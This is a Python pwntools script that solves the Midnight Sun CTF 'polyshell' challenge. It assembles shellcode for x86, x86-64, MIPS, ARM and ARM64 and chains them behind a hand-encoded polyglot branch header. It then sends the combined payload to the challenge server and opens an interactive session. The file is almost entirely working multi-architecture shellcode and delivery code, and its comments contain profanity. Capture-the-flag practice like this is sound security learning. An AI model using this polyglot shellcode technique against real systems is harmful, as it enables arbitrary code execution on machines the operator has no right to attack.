from pwn import *
from keystone import *
import math

r = remote("polyshell-01.play.midnightsunctf.se", 30000)

r.recvuntil("Syscall number: ")
syscall = int(r.recvline())
print syscall
r.recvuntil("1: ")
arg1 = int(r.recvline())
print arg1
r.recvuntil("string \"")
arg2 = r.recvuntil("\"").strip("\"")
print arg2

# pad it lol or ARM will be unreliable (??)
arg2 = arg2.ljust(4*int(math.ceil(len(arg2)/4.0)),'\x00')

shellx8664 = shellcraft.amd64.pushstr(arg2) + """mov rsi, rsp
mov rdi, {arg1}
mov rax, {sysnum}
syscall"""

shellx86 = shellcraft.i386.pushstr(arg2) + """mov ecx, esp
mov ebx, {arg1}
mov eax, {sysnum}
int 0x80"""

shellmips = shellcraft.mips.pushstr(arg2) + """move $a1, $sp
li $a0, {arg1}
li $v0, {sysnum}
syscall"""

shellarm = shellcraft.arm.pushstr(arg2) + """mov r1, sp
mov r0, #%s
mov r7, #%s
svc #0"""

shellarm64 = """b label1
label2:
mov x1, x30
mov x0, #%s
mov x8, #%s
svc #0
label1:
bl label2"""

sice = shellarm64 % (arg1, syscall)
print sice
a = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
sice = a.asm(sice)
shellarm64 = ""
for i in sice[0]:
 	shellarm64 += chr(i)
shellarm64 += arg2

sice = shellarm % (arg1, syscall)
a = Ks(KS_ARCH_ARM, KS_MODE_ARM)
sice = a.asm(sice)
shellarm = ""
for i in sice[0]:
 	shellarm += chr(i)

shellmips = asm(shellmips.format(sysnum=str(syscall), arg1=str(arg1)), arch="mips")
shellx8664 = asm(shellx8664.format(sysnum=str(syscall), arg1=str(arg1)), os="linux", arch="amd64")
shellx86 = asm(shellx86.format(sysnum=str(syscall), arg1=str(arg1)), os="linux", arch="i386")

print shellarm64.encode("hex")
print shellarm.encode("hex")
print shellx8664.encode("hex")
print shellx86.encode("hex")
print shellmips.encode("hex")

payload = ''
payload += 'eb1e0032'   # 0000 x86,x86_64 jump to 0x6b. everything else nop
payload += '04004210'   # 0004 MIPS jump to 0x18. both ARMs nop
payload += 'eb690032'   # 0008 required nop for MIPS stupid fucking idiotic branch delay slot nonsense bullshit fuck you mips go die in a fucking fire
payload += '000000ea'   # 000c ARM jump to 0x14. ARM64 nop
payload += '3c000014'   # 0010 ARM64 jump to final payload (0x100)
payload += '7a0000ea'   # 0014 ARM jump to final payload (0x200)
payload += 'b9000010'   # 0018 MIPS jump to final payload (0x300)
payload += '00000000'   # 001c MIPS branch delayed slot nop shit
payload += '31c04090'   # 0020 x86,x86_64 differentiator
payload += '7405'       # 0024 x64 jump to 0x2b
payload += 'e9d5030000' # 0026 x86 jump to final payload (0x400)
payload += 'e9d0040000' # 002b x64 jump to final payload (0x500)
payload += '00'*(0x100-len(payload)/2) # pad
payload += shellarm64.encode("hex")
payload += '00'*(0x200-len(payload)/2) # pad
payload += shellarm.encode("hex")
payload += '00'*(0x300-len(payload)/2) # pad
payload += shellmips.encode("hex")
payload += '00'*(0x400-len(payload)/2) # pad
payload += shellx86.encode("hex")
payload += '00'*(0x500-len(payload)/2) # pad
payload += shellx8664.encode("hex")
assert len(payload)<4096

r.sendline(payload)
# r.sendline(shellarm64.encode('hex'))

r.interactive()

